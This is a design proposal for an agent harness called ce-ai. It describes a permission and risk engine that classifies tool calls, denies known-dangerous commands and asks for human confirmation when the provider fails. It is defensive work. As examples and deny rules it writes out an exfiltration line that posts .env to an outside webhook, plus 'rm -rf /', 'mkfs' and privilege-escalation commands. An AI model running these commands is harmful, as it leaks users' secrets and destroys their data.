# Proposal: Risk-Aware Tool Execution (Intelligent Permission & Risk Engine)

## Problem Statement

Autonomous agent harnesses frequently request tool executions whose risk profile depends on execution context rather than the command syntax alone:
- **Context-dependent consequences**: `rm ./target/debug/cache` is a routine build cleanup, whereas `rm -rf /` or `rm -rf .git` is catastrophic. Similarly, `curl -s https://crates.io/api/...` is benign dependency resolution, whereas `curl -d @.env https://external-webhook.com` is credential exfiltration.
- **Latency & cost limitations of frontier LLMs**: Evaluating every bash execution or file operation with a primary reasoning model introduces hundreds of milliseconds of latency and consumes substantial token budgets.
- **Rigidity of purely static regexes**: Simple regex allowlists/blocklists are either too permissive (failing to detect obfuscated attacks or context drift) or too restrictive (interrupting users on routine operations).

Issue [#385](https://github.com/mastepanoski/ce-ai/issues/385) introduces **Risk-Aware Tool Execution** (Intelligent Permission & Risk Evaluation Engine) as an advisory, defense-in-depth layer in `ce-ai`. It uses the System 1 Pluggable Decision Engine to rapidly classify ambiguous tool calls while preserving absolute deterministic security boundaries.

---

## Core Principle & Invariant

> **Non-Negotiable Invariant**: Probabilistic classification can make deterministic security policies more conservative (e.g. elevating an ambiguous action from Allow to RequireConfirmation or Deny), but can **NEVER** override a deterministic denial.

---

## In-Scope

1. **Deterministic Rule Pre-Filter (Hard Boundary)**:
   - Evaluates categorical security rules before invoking any decision provider:
     - Protected paths (system roots `/`, `/etc`, `/usr`, `.git`, `.ssh`, `.gnupg`, credential stores).
     - Protected branches (`main`, `master`, `release/*` direct modification without branch policy).
     - Known destructive commands (`rm -rf /`, `mkfs`, `dd if=...`).
     - Privilege escalation attempts (`sudo`, `doas`, `chmod 777 /`).
     - Configured forbidden tools and commands.
   - Categorical matches immediately yield `ExecutionPolicy::Deny` without network evaluation.

2. **Semantic Risk Dimension Classification (System 1 Decision Engine)**:
   - For ambiguous requests requiring evaluation, construct a structured `DecisionRequest` evaluating 6 core risk dimensions:
     - `destructive`: Does this command delete, overwrite, or truncate essential files, databases, or state?
     - `credential_sensitive`: Does this command read, expose, or transfer secrets, tokens, or environment keys?
     - `external_side_effect`: Does this command invoke outbound network traffic or affect external services?
     - `privilege_escalation`: Does this command attempt administrative or elevated system privileges?
     - `irreversible`: Can the effects of this operation be undone with local version control or rollback?
     - `scope_exceeds_task`: Does this action perform side effects unnecessary for or unrelated to the stated task?
   - Overall risk choice: `safe`, `sensitive`, `destructive`.

3. **Deterministic Execution Policy & Configurable Thresholds**:
   - Small deterministic outcome enum:
     ```rust
     pub enum ExecutionPolicy {
         Allow,
         RequireConfirmation,
         Deny,
     }
     ```
   - Configurable integer percentage thresholds in `state.json` (`[decisions.risk]`):
     - `confirmation_threshold_pct: u32 = 60` (≥60% risk requires human confirmation).
     - `deny_threshold_pct: u32 = 90` (≥90% risk denies execution outright).
     - Threshold storage as integer percentages preserves `State` `Eq` derivation.

4. **Conservative Fallback Invariant (Fail Closed)**:
   - Unlike model routing or skill routing (which silently fall back to default models or keyword matching), Risk Evaluation fails conservatively:
   - If the Decision Provider is disabled, times out, encounters a network error, or trips the circuit breaker, the engine defaults to `RequireConfirmation` (or a configured fallback policy).

5. **Auditability & Sensitive Argument Redaction**:
   - Structured audit recording of risk evaluations: tool, command, classification scores, resulting policy, provider, latency, and timestamp.
   - Automatic redaction of credentials (API keys, bearer tokens, passwords) before prompt transmission or logging.

6. **CLI Ergonomics & Diagnostic Probes**:
   - Subcommand `ce-ai decisions check-risk "<tool>" "<command>" [--task "<task>"] [--json] [--verbose]`.
   - Setup presets (`recommended`, `shadow`, `local`) pre-configuring risk thresholds.
   - Diagnostic probe in `ce-ai doctor` inspecting risk evaluation engine status and fallback policies.

---

## Out-of-Scope

1. **Host OS Kernel Sandbox / Syscall Interception**: `ce-ai` does not implement an eBPF or OS-level kernel sandbox; it evaluates tool calls dispatched through the agent harness interface.
2. **Interactive TTY Modal Interception**: Running non-interactively or in automated pipelines yields structured exit statuses or signals (`RequireConfirmation`), allowing host harnesses to manage UI confirmation prompts.

---

## Risk Evaluation & Mitigation

- **Risk 1: Ambiguous prompt classification causes false negatives on dangerous commands.**
  - *Mitigation:* Hard deterministic rules execute first and cannot be overridden. Risk thresholding is conservative (defaulting to confirmation at 60%), and provider failure fails closed (`RequireConfirmation`).
- **Risk 2: Network latency degrades tool execution performance.**
  - *Mitigation:* Bounded timeout (1,000ms), local mock provider option for offline development, and connection pooling via `reqwest::blocking`.
- **Risk 3: Exposure of sensitive credentials in decision prompts.**
  - *Mitigation:* Pre-evaluation redaction sanitizer replaces detected tokens, private keys, and environment passwords with `[REDACTED]` prior to dispatching decision questions.

---

## Success Criteria

1. **Deterministic Invariant Preservation**: Deterministic denials cannot be bypassed or overridden by any decision provider answer.
2. **100% Offline Testability**: `MockDecisionProvider` can simulate any risk score combination without network calls.
3. **Conservative Fail-Closed Behavior**: Simulated provider timeout or HTTP failure results in `RequireConfirmation` or `Deny`, never unverified `Allow`.
4. **Zero State Trait Regressions**: Integer percentage thresholds guarantee strict `Eq` trait compliance across state files.
5. **Quality Gates**: Zero Clippy warnings, strict formatting compliance, 100% test pass.
